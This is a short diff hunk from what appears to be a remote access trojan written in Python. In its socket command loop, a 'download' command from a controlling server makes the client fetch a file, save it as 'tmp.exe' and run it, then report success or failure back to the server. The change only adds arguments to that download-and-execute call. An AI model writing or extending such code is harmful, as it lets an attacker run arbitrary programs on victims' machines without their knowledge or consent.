@@ -50,7 +50,7 @@ def socket_control():
 							socket_server.close()
 							sys.exit()
 						elif (data.split()[0] == "download"):
-							if (download_execute(data.split()[1]) == True):
+							if (download_execute(data.split()[1],"tmp.exe",1) == True):
 								socket_server.send(encode("\nDownload and execute finished\n"))
 							else:
 								socket_server.send(encode("\nError while downloading and execute\n"))						
